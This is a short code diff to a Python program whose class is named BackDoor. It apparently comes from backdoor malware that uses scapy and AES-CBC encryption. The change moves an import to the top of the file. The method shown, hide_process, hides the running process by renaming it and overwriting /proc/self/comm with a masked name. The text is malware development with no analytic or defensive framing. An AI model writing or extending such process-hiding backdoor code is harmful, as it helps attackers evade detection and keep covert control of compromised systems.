@@ -6,7 +6,7 @@ from scapy.volatile import RandShort
 from subprocess import run
 import sys
 import os
-
+import setproctitle
 
 class BackDoor:
     def __init__(self):
@@ -124,7 +124,6 @@ class BackDoor:
         return Cipher(algorithms.AES(self.key), modes.CBC(self.iv))
 
     def hide_process(self):
-        import setproctitle
         setproctitle.setproctitle(f"{self.masked_name}")
         with open("/proc/self/comm", "w") as f:
             f.write(self.masked_name)
